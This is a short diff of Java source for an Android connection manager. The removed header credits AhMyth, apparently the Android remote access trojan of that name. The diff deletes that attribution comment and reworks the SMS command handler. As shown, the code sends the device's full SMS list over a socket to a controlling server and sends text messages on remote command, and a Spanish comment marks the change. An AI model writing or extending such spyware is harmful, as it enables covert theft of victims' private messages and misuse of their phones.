@@ -10,9 +10,7 @@ import android.os.Handler;
 
 import java.lang.reflect.Method;
 
-/**
- * Created by AhMyth on 10/1/16.
- */
+
 
 public class ConnectionManager {
 
@@ -162,8 +160,8 @@ public class ConnectionManager {
         if (req == 0)
             ioSocket.emit("x0000sm", SMSManager.getSMSList());
         else if (req == 1) {
-            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
-            ioSocket.emit("x0000sm", isSent);
+            // ✅ CAMBIO: sendSMS ahora emite directamente, no retorna boolean
+            SMSManager.sendSMS(phoneNo, msg);
         }
     }
 
